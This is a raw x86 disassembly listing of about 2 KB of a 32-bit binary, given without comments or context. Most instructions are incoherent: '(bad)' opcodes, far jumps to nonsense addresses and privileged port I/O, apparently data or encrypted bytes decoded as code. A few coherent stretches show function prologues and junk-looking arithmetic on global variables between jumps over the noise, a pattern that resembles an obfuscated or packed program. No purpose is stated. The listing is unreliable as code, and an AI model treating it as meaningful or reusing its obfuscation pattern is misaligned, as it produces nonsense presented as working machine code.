  4060ff:	xchg   BYTE PTR [esi],dl
  406101:	and    BYTE PTR [ecx-0x37],ch
  406104:	(bad)  
  406105:	gs clc 
  406107:	aas    
  406108:	pop    esi
  406109:	stos   DWORD PTR es:[edi],eax
  40610a:	int3   
  40610b:	mov    WORD PTR [edx-0x75],gs
  40610e:	fwait
  40610f:	dec    ecx
  406110:	sar    DWORD PTR [eax+eiz*2+0xe],1
  406114:	pop    ebx
  406115:	popa   
  406116:	cmp    DWORD PTR [edi],ebx
  406118:	xchg   ebp,eax
  406119:	lock cli 
  40611b:	pop    esp
  40611c:	xchg   edx,eax
  40611d:	add    edx,ebp
  40611f:	std    
  406120:	stos   BYTE PTR es:[edi],al
  406121:	mov    eax,ds:0xa25349cc
  406126:	mov    edi,0xac534ce9
  40612b:	call   0x9f1b:0xc25c7e4e
  406132:	mov    DWORD PTR ds:0xe9964656,ecx
  406138:	lock sahf 
  40613a:	test   eax,0x28f09e89
  40613f:	in     eax,dx
  406140:	stc    
  406141:	ret    0x8fde
  406144:	fdivr  st(4),st
  406146:	or     esi,DWORD PTR ds:0xc342d90c
  40614c:	pop    edi
  40614d:	sbb    WORD PTR [edx*4-0x6588e087],bx
  406155:	aad    0x10
  406157:	mov    dh,0x96
  406159:	sub    al,0x75
  40615b:	inc    esi
  40615c:	mov    ch,0x93
  40615e:	retf   
  40615f:	shr    BYTE PTR [ebx+0x41],cl
  406162:	push   ds
  406163:	mov    cl,0x2b
  406165:	pop    eax
  406166:	lods   al,BYTE PTR ds:[esi]
  406167:	int    0x6d
  406169:	mov    ah,0xa2
  40616b:	clc    
  40616c:	xor    ecx,edi
  40616e:	push   0xffffffdd
  406170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406171:	into   
  406172:	(bad)  
  406173:	cmp    al,0x6e
  406175:	dec    esi
  406176:	push   ss
  406177:	sbb    eax,0xc8585c8b
  40617c:	fwait
  40617d:	leave  
  40617e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40617f:	into   
  406180:	or     bh,BYTE PTR [esi-0x14]
  406183:	ins    BYTE PTR es:[edi],dx
  406184:	mov    edx,0xcb8e6446
  406189:	mov    ecx,0x130a8dae
  40618e:	jo     0x40617c
  406190:	aam    0xdb
  406192:	std    
  406193:	xchg   edi,eax
  406194:	loope  0x40611d
  406196:	jmp    0xb8ef:0x4cc68b2f
  40619d:	es push cs
  40619f:	repnz (bad) 
  4061a1:	jge    0x406130
  4061a3:	dec    ecx
  4061a4:	sub    BYTE PTR [ecx-0x602caa05],bh
  4061aa:	push   esp
  4061ab:	sbb    eax,0x831b813c
  4061b0:	cs inc esi
  4061b2:	jae    0x40613c
  4061b4:	ins    DWORD PTR es:[edi],dx
  4061b5:	mov    ds:0x88de86bc,eax
  4061ba:	sar    BYTE PTR [edi+0x24],cl
  4061bd:	inc    esi
  4061be:	dec    eax
  4061bf:	mov    ds:0x8706f961,eax
  4061c4:	cmp    edi,DWORD PTR [ebp+0xd]
  4061c7:	stc    
  4061c8:	js     0x40614e
  4061ca:	fidivr DWORD PTR [ebx+0x34d65e35]
  4061d0:	jecxz  0x4061a9
  4061d2:	dec    esi
  4061d3:	mov    ebx,0xe51fd528
  4061d8:	push   0xffffff99
  4061da:	aas    
  4061db:	jp     0x4061e3
  4061dd:	xchg   edi,eax
  4061de:	push   edx
  4061df:	sbb    DWORD PTR [ebx+0x41fca229],ebp
  4061e5:	test   al,0xbb
  4061e7:	popa   
  4061e8:	aas    
  4061e9:	sub    eax,ebx
  4061eb:	pop    esp
  4061ec:	(bad)  
  4061ed:	pop    es
  4061ee:	aad    0x5
  4061f0:	mov    bl,0x2
  4061f2:	(bad)  
  4061f3:	fcmovne st,st(7)
  4061f5:	repz shl BYTE PTR [edi],1
  4061f8:	xchg   DWORD PTR [eax+0x7c4021b2],eax
  4061fe:	sbb    bh,BYTE PTR ss:[edi-0x61]
  406202:	inc    ebx
  406203:	cld    
  406204:	adc    esi,esp
  406206:	adc    al,0x69
  406208:	ret    0xd06c
  40620b:	mov    al,ds:0x9bea7488
  406210:	inc    ebx
  406211:	xor    BYTE PTR [ecx],bh
  406213:	xchg   BYTE PTR [edx+0x1ce556db],ah
  406219:	dec    eax
  40621a:	ja     0x406205
  40621c:	xlat   BYTE PTR ds:[ebx]
  40621d:	test   BYTE PTR [esi],ch
  40621f:	and    bh,BYTE PTR [edx-0x684d4f31]
  406225:	inc    edi
  406226:	cwde   
  406227:	and    al,0x81
  406229:	add    al,0x76
  40622b:	adc    al,0xbe
  40622d:	sahf   
  40622e:	push   ecx
  40622f:	sbb    ah,BYTE PTR [ebp+edx*2+0x6e9422f8]
  406236:	adc    esp,DWORD PTR [esi+0x33]
  406239:	lds    ebp,FWORD PTR [eax-0x1258ccc6]
  40623f:	daa    
  406240:	fimul  WORD PTR [ecx+ebx*8+0x11]
  406244:	add    edx,DWORD PTR [edx+eax*1-0x2e]
  406248:	into   
  406249:	jg     0x4062c3
  40624b:	dec    ebx
  40624c:	lods   al,BYTE PTR ds:[esi]
  40624d:	mov    edi,0xbb5760a6
  406252:	repz adc BYTE PTR [edx+0x5a],ch
  406256:	out    0x39,eax
  406258:	jmp    0xe8ee38f2
  40625d:	imul   esp,DWORD PTR [ecx+0x4b],0xffffff92
  406261:	add    eax,0xc5712f23
  406266:	sub    bl,BYTE PTR [ebx]
  406268:	push   esp
  406269:	aas    
  40626a:	push   edx
  40626b:	jge    0x40620b
  40626d:	ror    DWORD PTR [edi],1
  40626f:	int3   
  406270:	lods   al,BYTE PTR cs:[esi]
  406272:	xchg   edx,eax
  406273:	mov    bh,0xb6
  406275:	xchg   esi,eax
  406276:	mov    ebp,0xcedc5a89
  40627b:	sbb    ebp,ebx
  40627d:	mov    bl,0xba
  40627f:	(bad)  
  406282:	jle    0x406223
  406284:	add    cl,BYTE PTR [edx+0x7c7eb117]
  40628a:	xchg   BYTE PTR [ebx],bl
  40628c:	cmp    edi,esp
  40628e:	mov    eax,DWORD PTR [ebp+0x18]
  406291:	mov    esi,DWORD PTR [ebp+0x10]
  406294:	sub    DWORD PTR ds:0x42fc89,0x42fd06
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e673,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fcf2,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fcf2,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fcf2,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e4bb
  4062e2:	cmp    DWORD PTR ds:0x42fcf2,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fcf2
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fcf2,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fcf2
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fcf2,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	mov    BYTE PTR [esi],bh
  406330:	leave  
  406331:	mov    ah,0x8c
  406333:	cmp    al,0x70
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x406311
  40633b:	(bad)  
  40633c:	xchg   esp,eax
  40633d:	retf   0x1044
  406340:	test   al,0xec
  406342:	push   esp
  406343:	out    0xaa,al
  406345:	add    al,0x60
  406347:	ds lahf 
  406349:	daa    
  40634a:	push   es
  40634b:	or     BYTE PTR [edi-0x23a9b993],bl
  406351:	aas    
  406352:	loopne 0x40639a
  406354:	imul   ebx,edx,0x51242bf7
  40635a:	pop    esp
  40635b:	push   ss
  40635c:	test   eax,0x8d390625
  406361:	in     eax,dx
  406362:	xchg   esp,eax
  406363:	fmul   QWORD PTR [eax+0x1c]
  406366:	test   al,0xfc
  406368:	sar    DWORD PTR [ebp+ecx*2-0x3a],0x6e
  40636d:	jle    0x406395
  40636f:	fwait
  406370:	dec    edi
  406371:	mov    eax,ds:0xa7fd6afa
  406376:	dec    BYTE PTR [esi]
  406378:	and    BYTE PTR [ecx+0x25bfc460],ch
  40637e:	inc    ecx
  40637f:	dec    DWORD PTR [edi+0x1d]
  406382:	adc    edi,esi
  406384:	stos   BYTE PTR es:[edi],al
  406385:	adc    edi,ecx
  406387:	or     dl,al
  406389:	adc    DWORD PTR [eax],ecx
  40638b:	push   0xb7c8ce3e
  406390:	inc    edi
  406391:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406392:	es inc ebx
  406394:	mov    cl,0x1
  406396:	mov    dl,BYTE PTR [ebp*2-0x7f7ab4be]
  40639d:	lahf   
  40639e:	arpl   WORD PTR [ebx-0x7d],sp
  4063a1:	ficom  DWORD PTR [ecx+0x42]
  4063a4:	cmp    al,0x7b
  4063a6:	scas   al,BYTE PTR es:[edi]
  4063a7:	fs pushf 
  4063a9:	mov    al,ds:0xe1d47ad7
  4063ae:	loop   0x4063ce
  4063b0:	mov    cl,0x1b
  4063b2:	inc    edx
  4063b3:	outs   dx,BYTE PTR ds:[esi]
  4063b4:	mov    edi,0x61363c3b
  4063b9:	xlat   BYTE PTR ds:[ebx]
  4063ba:	nop
  4063bb:	dec    ebp
  4063bc:	xor    BYTE PTR [ecx+0x3a98b11e],0xa6
  4063c3:	add    al,0x27
  4063c5:	cld    
  4063c6:	mov    al,ds:0x62b74a1e
  4063cb:	mov    eax,0xc6099e6b
  4063d0:	inc    edi
  4063d1:	lods   al,BYTE PTR ds:[esi]
  4063d2:	cdq    
  4063d3:	xchg   esp,eax
  4063d4:	inc    eax
  4063d5:	push   ebp
  4063d6:	cmp    esi,DWORD PTR ds:0xf5e0eea3
  4063dc:	iret   
  4063dd:	test   bl,dl
  4063df:	jg     0x406389
  4063e1:	loopne 0x406435
  4063e3:	add    ebp,DWORD PTR [edi]
  4063e5:	jl     0x40640c
  4063e7:	ja     0x40640b
  4063e9:	in     eax,dx
  4063ea:	xchg   esp,eax
  4063eb:	(bad)  
  4063ec:	dec    ebx
  4063ed:	pop    ds
  4063ee:	cmp    DWORD PTR ds:0xe179ebc1,0x16
  4063f5:	xchg   ebp,eax
  4063f6:	enter  0xa835,0x8c
  4063fa:	xchg   BYTE PTR [eax+esi*1+0x74],bl
  4063fe:	inc    edi
  4063ff:	pop    edi
  406400:	jle    0x406402
  406402:	mov    BYTE PTR [ecx+0x18fdb0bf],dl
  406408:	pushf  
  406409:	mov    edi,0x6b6a55da
  40640e:	push   ebx
  40640f:	sub    bl,BYTE PTR [ecx-0x7c34a5a6]
  406415:	jne    0x4063d0
  406417:	mul    BYTE PTR [edi]
  406419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40641a:	sti    
  40641b:	pusha  
  40641c:	mov    cl,0xd5
  40641e:	in     al,0x80
  406420:	int3   
  406421:	jae    0x406473
  406423:	adc    eax,0x305e838
  406428:	mov    ebx,0x1506d04b
  40642d:	in     al,0xa6
  40642f:	popa   
  406430:	mov    eax,ds:0xdcd81abb
  406435:	loope  0x406429
  406437:	mov    ecx,0xe4736fa3
  40643c:	jle    0x4064a7
  40643e:	xchg   DWORD PTR [edi-0xb9272b6],esi
  406444:	push   es
  406445:	outs   dx,BYTE PTR ds:[esi]
  406446:	push   esp
  406447:	fidiv  WORD PTR [esi]
  406449:	push   DWORD PTR [ebx+0x183dd6b3]
  40644f:	xchg   ebp,eax
  406450:	xlat   BYTE PTR ds:[ebx]
  406451:	retf   0x4e5
  406454:	shl    DWORD PTR [ebx-0x8],1
  406457:	loope  0x4064b6
  406459:	or     DWORD PTR [ebx-0x63ed500c],eax
  40645f:	jb     0x4064db
  406461:	ret    0x1701
  406464:	loope  0x4063e6
  406466:	xchg   edi,eax
  406467:	scas   eax,DWORD PTR es:[edi]
  406468:	pop    DWORD PTR [edi]
  40646a:	inc    esp
  40646b:	jns    0x4063fd
  40646d:	pop    es
  40646e:	mov    ah,0x81
  406470:	mov    ds:0xee7b2790,eax
  406475:	xor    esi,DWORD PTR ds:0xb86909a9
  40647b:	retf   0x21bd
  40647e:	dec    edx
  40647f:	and    DWORD PTR [edx-0x26],edi
  406482:	inc    edx
  406483:	in     eax,dx
  406484:	bound  eax,QWORD PTR [ebx+0xb]
  406487:	hlt    
  406488:	rol    DWORD PTR [ebx],1
  40648a:	push   0xffffffb5
  40648c:	xor    dl,ah
  40648e:	jecxz  0x40649b
  406490:	push   edi
  406491:	sbb    BYTE PTR [ebx+ecx*2],dl
  406494:	xchg   DWORD PTR [ecx],edi
  406496:	mov    ah,0x38
  406498:	push   esi
  406499:	addr16 js 0xa6ec94dd
  4064a0:	xchg   edx,eax
  4064a1:	stos   BYTE PTR es:[edi],al
  4064a2:	pop    esi
  4064a3:	test   ch,dl
  4064a5:	xlat   BYTE PTR ds:[ebx]
  4064a6:	push   ss
  4064a7:	repz sbb al,0xa
  4064aa:	addr16 push es
  4064ac:	js     0x40648b
  4064ae:	popa   
  4064af:	push   ebp
  4064b0:	fwait
  4064b1:	ret    0x8db5
  4064b4:	pop    ds
  4064b5:	(bad)  
  4064b6:	jecxz  0x406485
  4064b8:	cwde   
  4064b9:	cmp    DWORD PTR [eax-0x7b],ecx
  4064bc:	push   es
  4064bd:	cmp    DWORD PTR [eax-0x5],edi
  4064c0:	lock in eax,0x85
  4064c3:	push   ebx
  4064c4:	fwait
  4064c5:	cs push ecx
  4064c7:	mov    eax,0x4b4b298c
  4064cc:	inc    ecx
  4064cd:	sub    eax,DWORD PTR [edi]
  4064cf:	aad    0x3d
  4064d1:	popa   
  4064d2:	ror    BYTE PTR [eax-0x3514413e],cl
  4064d8:	aaa    
  4064d9:	sub    al,BYTE PTR [esi]
  4064db:	mov    al,0x7f
  4064dd:	jecxz  0x40652a
  4064df:	or     cl,BYTE PTR [eax]
  4064e1:	(bad)  
  4064e2:	stos   DWORD PTR es:[edi],eax
  4064e3:	pop    esi
  4064e4:	leave  
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fcf6,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fc79
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fcf2,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fcf2,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fc59,0x42e67b
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	sar    BYTE PTR [ecx],1
  406568:	dec    ebx
  406569:	arpl   WORD PTR [ebx],si
  40656b:	cmp    dh,BYTE PTR [eax+0x70]
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	adc    cl,dl
  406574:	clc    
  406575:	sbb    esi,ecx
  406577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406579:	and    DWORD PTR ds:0xe3e4f5a6,ebx
  40657f:	inc    edx
  406580:	or     al,0x69
  406582:	mov    BYTE PTR [edi-0x23a8aaa2],ah
  406588:	repnz imul esi,DWORD PTR [ecx],0xffffffb6
  40658c:	aas    
  40658d:	lds    dx,DWORD PTR [ebx-0x74]
  406591:	outs   dx,BYTE PTR ds:[esi]
  406592:	sbb    dh,BYTE PTR [ebx-0x53]
  406595:	pop    ecx
  406596:	xchg   esp,eax
  406597:	jnp    0x40652a
  406599:	xor    eax,0x65600b30
  40659e:	int    0xda
  4065a0:	sub    eax,0x62a0e936
  4065a5:	mov    cl,0xd2
  4065a7:	jo     0x406541
  4065a9:	aad    0xc3
  4065ab:	loope  0x4065f7
  4065ad:	call   DWORD PTR [eax]
  4065af:	pop    esi
  4065b0:	fsubr  QWORD PTR [edi+0xd]
  4065b3:	rcl    ch,1
  4065b5:	inc    esi
  4065b6:	cld    
  4065b7:	adc    bh,BYTE PTR [ebp-0x16ad46c9]
  4065bd:	mov    bh,0xc6
  4065bf:	push   cs
  4065c0:	sub    BYTE PTR [esi],bh
  4065c2:	dec    esp
  4065c3:	stc    
  4065c4:	add    ebp,DWORD PTR [eax+eiz*8-0x63]
  4065c8:	cwde   
  4065c9:	cmp    DWORD PTR [eax],edi
  4065cb:	out    dx,al
  4065cc:	in     eax,0x9c
  4065ce:	xor    al,0x85
  4065d0:	cmp    DWORD PTR [edi-0x46],edi
  4065d3:	mov    esi,0xc884686c
  4065d8:	nop
  4065d9:	pop    esi
  4065da:	mov    esi,0xc3301284
  4065df:	dec    ebx
  4065e0:	daa    
  4065e1:	addr16 into 
  4065e3:	mov    ecx,0xd4d51432
  4065e8:	pop    es
  4065e9:	xor    al,0x56
  4065eb:	add    al,0xa4
  4065ee:	jnp    0x4065b5
  4065f0:	pop    ds
  4065f1:	pop    eax
  4065f2:	sar    DWORD PTR [eax-0x1bc9b725],cl
  4065f8:	jns    0x4065d5
  4065fa:	dec    ecx
  4065fb:	mov    bl,0x95
  4065fd:	jge    0x406634
  4065ff:	fmul   QWORD PTR [edx-0x66028d8b]
  406605:	dec    edi
  406606:	jecxz  0x406628
  406608:	inc    esi
  406609:	xchg   DWORD PTR fs:[ecx+ebx*4-0x60],ebx
  40660e:	stos   BYTE PTR es:[edi],al
  40660f:	add    al,0xef
  406611:	test   DWORD PTR [esi-0x4],0x94a8c3eb
  406618:	jb     0x4065b8
  40661a:	mul    al
  40661c:	loopne 0x406680
  40661e:	out    0xf6,eax
  406620:	sub    dl,BYTE PTR [edi+0x68]
  406623:	aam    0x41
  406625:	ret    
  406626:	mov    ah,0x17
  406628:	add    dh,dl
  40662a:	shr    WORD PTR [edx],cl
  40662d:	stos   DWORD PTR es:[edi],eax
  40662e:	inc    ebx
  40662f:	push   0xf1be5149
  406634:	push   ebx
  406635:	sub    edx,ebx
  406637:	scas   eax,DWORD PTR es:[edi]
  406638:	xor    edi,DWORD PTR [esi-0x6264cbe3]
  40663e:	int3   
  40663f:	xchg   edx,eax
  406640:	pop    esp
  406641:	gs loope 0x4065d9
  406644:	ins    BYTE PTR es:[edi],dx
  406645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406646:	bound  ebx,QWORD PTR [ebp-0x63]
  406649:	fwait
  40664a:	mov    ds:0x67595ff,al
  40664f:	js     0x40661b
  406651:	xchg   edi,eax
  406652:	cmp    al,0xdc
  406654:	push   0xdc75a061
  406659:	sub    ch,ah
  40665b:	adc    DWORD PTR [eax-0x4a5ad795],ebx
  406661:	data16 aaa 
  406663:	sbb    al,0xd0
  406665:	outs   dx,BYTE PTR ds:[esi]
  406666:	pop    ebx
  406667:	sub    DWORD PTR [edi],0xffffffee
  40666a:	fimul  WORD PTR [ecx+0x23]
  40666d:	icebp  
  40666e:	mov    esp,0xbf206d7e
  406673:	pusha  
  406674:	sbb    eax,0x93b39cf8
  406679:	cmc    
  40667a:	push   ds
  40667b:	sbb    esi,DWORD PTR [ebx]
  40667d:	test   BYTE PTR [ebx+ecx*1],dh
  406680:	push   es
  406681:	int    0x1
  406683:	neg    BYTE PTR [eax-0x79a86cc5]
  406689:	es mov ah,0xb
  40668c:	add    ah,al
  40668e:	dec    ebx
  40668f:	(bad)  
  406690:	fisubr WORD PTR [edx+0xb]
  406693:	scas   ax,WORD PTR es:[edi]
  406695:	cmp    eax,0x63f98c69
  40669a:	dec    esi
  40669b:	imul   esp,DWORD PTR [edx+0x6908af30],0x6b
  4066a2:	lahf   
  4066a3:	adc    BYTE PTR [edx],dl
  4066a5:	fmul   DWORD PTR [ecx+0x4aa4dac3]
  4066ab:	dec    ebx
  4066ac:	js     0x406665
  4066ae:	pop    ds
  4066af:	jecxz  0x4066ee
  4066b1:	xchg   ecx,eax
  4066b2:	xor    DWORD PTR [esi+0x58ec160d],esi
  4066b8:	jl     0x4066d8
  4066ba:	adc    BYTE PTR [edi],dl
  4066bc:	pop    es
  4066bd:	out    0x1e,al
  4066bf:	sbb    BYTE PTR [ecx-0x2c],ch
  4066c2:	add    dh,dl
  4066c4:	mov    eax,DWORD PTR [edi+ebx*1+0x2d]
  4066c8:	xor    bh,BYTE PTR [edi+edx*4+0x63]
  4066cc:	je     0x40668e
  4066ce:	dec    esi
  4066cf:	dec    ebx
  4066d0:	or     ah,BYTE PTR [ebx+0x5c]
  4066d3:	call   0x3237:0x159860c7
  4066da:	popf   
  4066db:	jnp    0x4066f1
  4066dd:	sbb    DWORD PTR [eax],esp
  4066df:	mov    dh,0xd5
  4066e1:	imul   ebx,DWORD PTR [ebp+0x4679cfbd],0xd62724b6
  4066eb:	mov    BYTE PTR gs:[edi],0xae
  4066ef:	int3   
  4066f0:	mov    esi,0x596ab14f
  4066f5:	sub    DWORD PTR [edi],edx
  4066f7:	jmp    0x1ea7:0x1884d2eb
  4066fe:	cmp    ebp,eax
  406700:	neg    DWORD PTR [eax-0x8]
  406703:	and    BYTE PTR [edx-0x60],0x61
  406707:	stc    
  406708:	out    dx,al
  406709:	dec    edi
  40670a:	inc    esi
  40670b:	xor    cl,BYTE PTR [edx-0x48]
  40670e:	or     BYTE PTR [edx-0x44],cl
  406711:	push   ds
  406712:	xor    BYTE PTR [ecx],0xb7
  406715:	fnstcw WORD PTR [ecx+0x286079fd]
  40671b:	or     ch,BYTE PTR [edi+0x63]
  40671e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40671f:	ja     0x4066cf
  406721:	lea    edi,[ecx-0x1e]
  406724:	in     al,0x7d
  406726:	mov    DWORD PTR [ebp+0x329d3a13],esp
  40672c:	add    al,0x11
  40672e:	xor    BYTE PTR [edx-0x4a46d6ad],ah
  406734:	mov    gs,ebp
  406736:	jo     0x4066c2
  406738:	inc    ebp
  406739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40673a:	and    DWORD PTR [ebx],ebx
  40673c:	dec    edx
  40673d:	mov    ds:0x179c47fb,eax
  406742:	cdq    
  406743:	sub    BYTE PTR [eax],ch
  406745:	loop   0x406721
  406747:	dec    ecx
  406748:	mov    ds:0xf590be0e,al
  40674d:	fisttp DWORD PTR [edi]
  40674f:	js     0x406708
  406751:	xchg   ebx,eax
  406752:	jmp    0x28e06ad1
  406757:	pusha  
  406758:	add    al,0x67
  40675a:	and    DWORD PTR [eax-0x53],edi
  40675d:	jmp    0x8294:0xbc650c46
  406764:	popf   
  406765:	push   esp
  406766:	test   BYTE PTR [edx],0xdf
  406769:	mov    bh,0xbc
  40676b:	pop    esi
  40676c:	mov    dl,0x7
  40676e:	mov    esi,0x2c6444f1
  406773:	sahf   
  406774:	sub    eax,0x37c2403d
  406779:	call   0xeae44f0d
  40677e:	mov    esi,0xb969327a
  406783:	cmp    DWORD PTR ds:0x660c3943,ebp
  406789:	loop   0x40679c
  40678b:	pop    esp
  40678c:	and    eax,0xbb2aa468
  406791:	lea    eax,[ecx+0x43a8f7c4]
  406797:	add    eax,0x38ea58f5
  40679c:	mov    ah,0x21
  40679e:	jns    0x406796
  4067a0:	xchg   edx,eax
  4067a1:	mov    bl,0xaf
  4067a3:	mov    dl,0x1a
  4067a5:	into   
  4067a6:	inc    ecx
  4067a7:	xor    al,BYTE PTR es:[eax]
  4067aa:	lock stos DWORD PTR es:[edi],eax
  4067ac:	stos   DWORD PTR es:[edi],eax
  4067ad:	retf   
  4067ae:	jnp    0x40681f
  4067b0:	jl     0x4067a7
  4067b2:	add    al,0x18
  4067b4:	(bad)  
  4067b5:	xchg   esi,eax
  4067b6:	jle    0x4067f1
  4067b8:	fstp   QWORD PTR [eax+0x5c]
  4067bb:	nop
  4067bc:	(bad)  
  4067bd:	mov    esp,0x47e76035
  4067c2:	mov    ecx,0xdc67a10d
  4067c7:	daa    
  4067c8:	inc    ebx
  4067c9:	icebp  
  4067ca:	fs je  0x40678f
  4067cd:	ins    DWORD PTR es:[edi],dx
  4067ce:	inc    eax
  4067cf:	lods   eax,DWORD PTR ds:[esi]
  4067d0:	pushf  
  4067d1:	cmc    
  4067d2:	ret    0x8e56
  4067d5:	push   DWORD PTR [edi-0x4ae3a320]
  4067db:	adc    dh,bh
  4067dd:	sbb    al,ch
  4067df:	adc    al,0x8b
  4067e1:	push   ebp
  4067e2:	adc    BYTE PTR [ecx-0x3dccf7be],cl
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fc55,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e0a0,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e67b,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fc65,0x42e693
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	mov    bh,0x2b
  406848:	ja     0x406855
  40684a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	and    BYTE PTR [edi],bl
  406854:	dec    ebp
  406855:	add    dh,ah
  406857:	inc    edi
  406858:	push   cs
  406859:	popa   
  40685a:	ins    DWORD PTR es:[edi],dx
  40685b:	idiv   bl
  40685d:	ss jb  0x40680d
  406860:	mov    cs,esp
  406862:	(bad)  
  406863:	sti    
  406864:	jns    0x406881
  406866:	add    BYTE PTR [ecx-0x50],ch
  406869:	jae    0x406866
  40686b:	adc    al,0xe7
  40686d:	jns    0x406804
  40686f:	es out dx,al
  406871:	or     bl,BYTE PTR [ebx-0x5f]
  406874:	(bad)  
  406875:	xor    ch,BYTE PTR [ebx]
  406877:	mov    ah,0x47
  406879:	fisubr DWORD PTR [ebp+0x6e972a22]
  40687f:	xor    BYTE PTR [edi],bh
  406881:	imul   ecx,ecx,0xffffffd3
  406884:	mov    dl,0xbe
  406886:	in     al,dx
  406887:	push   edx
  406888:	jecxz  0x4068af
  40688a:	test   eax,0x2b107525
  40688f:	out    0x12,al
  406891:	xchg   esp,eax
  406892:	fnstsw WORD PTR [eax-0x1682a3aa]
  406898:	cmp    ah,bh
  40689a:	stos   DWORD PTR es:[edi],eax
  40689b:	rcr    BYTE PTR [ecx-0x77],1
  40689e:	xchg   ebx,eax
  40689f:	adc    edi,ebp
  4068a1:	push   edx
  4068a2:	xor    eax,0xaed7e4b4
  4068a7:	loopne 0x4068b8
  4068a9:	in     al,0x0
  4068ab:	lds    esi,FWORD PTR [eax+0x6b]
  4068ae:	adc    BYTE PTR [eax],bl
  4068b0:	cld    
  4068b1:	mov    dh,0x47
  4068b3:	sub    eax,0x280146f3
  4068b8:	sub    dh,cl
  4068ba:	enter  0x1633,0xee
  4068be:	scas   eax,DWORD PTR es:[edi]
  4068bf:	popf   
  4068c0:	mov    WORD PTR [ebx-0x648c97cf],?
  4068c6:	jb     0x406898
  4068c8:	aam    0xf9
  4068ca:	addr16 shl ecx,cl
  4068cd:	fwait
  4068ce:	nop
  4068cf:	(bad)  [esp+edx*8-0x1588c02d]
  4068d6:	lahf   
  4068d7:	retf   0x128b
  4068da:	fnstcw WORD PTR [eax]
  4068dc:	inc    esi
  4068dd:	lds    edi,FWORD PTR [esi+0x8]
  4068e0:	sub    eax,0x5beff2f3
  4068e5:	add    al,0x12
  4068e7:	xchg   dx,ax
  4068e9:	sar    edx,cl
  4068eb:	mov    ds:0x9fe484a,eax
  4068f0:	dec    dl
  4068f2:	cs dec edi
  4068f4:	test   al,0xb9
  4068f6:	sti    
  4068f7:	sub    BYTE PTR [ecx],0x89
